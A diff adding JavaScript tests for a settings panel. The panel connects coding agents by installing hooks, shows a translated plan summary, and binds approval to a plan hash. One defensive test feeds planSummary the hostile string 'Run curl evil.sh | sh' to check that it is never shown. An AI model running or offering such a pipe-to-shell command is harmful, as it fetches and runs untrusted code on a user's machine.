@@ -420,16 +420,16 @@ test('agents: three known agents, names from OUR table, never from the engine pa
 });
 
 test('agents: each state is icon + one word with the right button — «Conectar», «Actualizar», «Desconectar» — never a terminal', () => {
-  const row = (state, extra = {}) => S.agentsView(agentsState([{ id: 'codex', state, backup: false, detail: null, ...extra }])).rows[0];
+  const row = (state, extra = {}) => S.agentsView(agentsState([{ id: 'codex', state, backup: false, detail: null, plan_hash: 'b'.repeat(64), summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first.', reviewable: true, ...extra }])).rows[0];
   const nc = row('not_connected');
   assert.deepEqual([nc.word, nc.tone, nc.primary && nc.primary.label], ['Sin conectar', 'faint', 'Conectar']);
-  assert.deepEqual(nc.primary.command, { action: 'agent_connect', agentId: 'codex' });
+  assert.deepEqual(nc.primary.command, { action: 'agent_connect', agentId: 'codex', plan_hash: 'b'.repeat(64) });
   assert.equal(nc.secondary, null);
   const ok = row('connected');
   assert.deepEqual([ok.word, ok.tone, ok.primary], ['Conectado', 'go', null]);
   assert.deepEqual(ok.secondary, { label: 'Desconectar', command: { action: 'agent_disconnect', agentId: 'codex' } });
   const old = row('outdated');
-  assert.equal(old.primary.label, 'Actualizar'); assert.equal(old.primary.command.action, 'agent_connect'); assert.equal(old.secondary.label, 'Desconectar');
+  assert.equal(old.primary.label, 'Actualizar'); assert.equal(old.primary.command.action, 'agent_connect'); assert.equal(old.primary.command.plan_hash, 'b'.repeat(64)); assert.equal(old.secondary.label, 'Desconectar');
   const work = row('working');
   assert.deepEqual([work.word, work.primary, work.secondary, work.busy], ['En curso', null, null, true]);
   const gone = row('unavailable');
@@ -554,6 +554,93 @@ test('connecting: the screen draws «Conectando» while the first state is on it
   const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
   assert.match(src, /CONNECT_WAIT_MS/);
   assert.doesNotMatch(src, /agentState \|\| \{ connection: 'no_daemon'/, 'the stand-in for «no state yet» must not claim the engine is missing');
+});
+
+// ---- #310 final contract (H2b): show the plan, send its hash back, refuse a big change, say what to do after Codex ----
+const HASH = 'a'.repeat(64);
+const plan = (extra = {}) => ({ id: 'claude-code', state: 'not_connected', backup: false, detail: null, plan_hash: HASH,
+  summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first.', reviewable: true, trust_review: false, ...extra });
+const rowOf = (entry, id) => S.agentsView(agentsState([entry])).rows[0];
+
+test('plan: the closed summary is shown next to the button, and the click carries the hash the human saw', () => {
+  const r = rowOf(plan());
+  assert.equal(r.primary.label, 'Conectar');
+  assert.deepEqual(r.primary.command, { action: 'agent_connect', agentId: 'claude-code', plan_hash: HASH });
+  assert.equal(r.summary, 'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo.');
+  assert.match(r.aria, /Agrega los hooks/);
+  const upd = rowOf(plan({ state: 'outdated', summary: 'Updates the Abito hooks in ~/.claude/settings.json. A backup is made first.' }));
+  assert.equal(upd.primary.label, 'Actualizar'); assert.equal(upd.primary.command.plan_hash, HASH);
+  assert.equal(upd.summary, 'Actualiza los hooks de Abito en ~/.claude/settings.json. Antes se hace un respaldo.');
+  // a disconnect never carries a plan
+  assert.deepEqual(rowOf(plan({ state: 'connected' })).secondary.command, { action: 'agent_disconnect', agentId: 'claude-code' });
+});
+
+test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
+  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
+    'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
+  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
+    'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
+  for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
+    const t = S.planSummary(odd);
+    assert.equal(t, 'Se van a agregar los hooks de Abito. Antes se hace un respaldo.', `${String(odd).slice(0, 20)} -> generic sentence`);
+  }
+});
+
+test('plan: no hash means no click that could apply a plan the human did not see', () => {
+  for (const bad of [null, undefined, '', 'zz', 'A'.repeat(64), 'a'.repeat(63), 'a'.repeat(65), 7]) {
+    const r = rowOf(plan({ plan_hash: bad }));
+    assert.equal(r.primary, null, `plan_hash ${JSON.stringify(bad)}: no button`);
+    assert.match(r.note, /vista previa|volvé a intentar|recargá/i);
+  }
+});
+
+test('plan: a change the installer could not show in full is NOT offered as one click', () => {
+  const r = rowOf(plan({ reviewable: false, summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.' }));
+  assert.equal(r.primary, null, 'no 1-click');
+  assert.equal(r.reviewable, false);
+  assert.match(r.note, /cambio grande: revisalo en el archivo/i);
+  assert.ok(!/terminal|comando/i.test(JSON.stringify(r)));
+  // an outdated one that is not reviewable can still be disconnected
+  assert.equal(rowOf(plan({ state: 'outdated', reviewable: false })).secondary.label, 'Desconectar');
+});
+
+test('details: plan_changed re-shows the NEW plan; audit_unavailable and install_failed render with their own sentences', () => {
+  const again = rowOf(plan({ state: 'error', detail: 'plan_changed' }));
+  assert.equal(again.word, 'No se pudo');
+  assert.match(again.note, /algo cambió desde la vista previa/i);
+  assert.match(again.note, /volvé a intentar/i);
+  assert.equal(again.primary.label, 'Reintentar');
+  assert.equal(again.primary.command.plan_hash, HASH, 'the retry is bound to the NEW plan that came back');
+  assert.ok(again.summary, 'the new summary is shown again');
+  assert.match(rowOf(plan({ state: 'error', detail: 'audit_unavailable', plan_hash: null, summary: null })).note, /registro|auditor/i);
+  assert.match(rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null })).note, /no se tocó|no se pudo/i);
+  // an error without a plan cannot be retried blindly with a stale one
+  const noPlan = rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null }));
+  assert.equal(noPlan.primary.command.plan_hash, undefined);
+  assert.equal(noPlan.primary.label, 'Reintentar');
+});
+
+test('trust: after Codex connects the human is told what to do next, in the panel (never a terminal)', () => {
+  const r = rowOf({ id: 'codex', state: 'connected', backup: true, detail: null, trust_review: true });
+  assert.match(r.note, /confiá en los hooks/i);
+  assert.match(r.note, /\/hooks/);
+  assert.equal(r.trust, true);
+  assert.equal(rowOf({ id: 'codex', state: 'connected', backup: true, detail: null, trust_review: false }).trust, false);
+  assert.equal(rowOf({ id: 'claude-code', state: 'connected', backup: false, detail: null, trust_review: true }).trust, true);
+});
+
+test('opencode: always «No encontrado», never a button', () => {
+  const r = rowOf({ id: 'opencode', state: 'unavailable', backup: false, detail: null });
+  assert.equal(r.primary, null); assert.equal(r.secondary, null); assert.equal(r.word, 'No encontrado');
+});
+
+test('wiring: the plan summary is drawn above the button and the trust hint is its own highlighted line', () => {
+  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
+  assert.match(src, /r\.summary[^\n]*splan/);
+  assert.match(src, /strust/);
+  assert.ok(src.indexOf("r.summary") < src.indexOf("r.primary.label"), 'the summary comes before the button that approves it');
+  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
+  assert.match(css, /\.splan\s*\{/); assert.match(css, /\.strust\s*\{/);
 });
 
 console.log(`settings-view-check: ${passed} passed`);
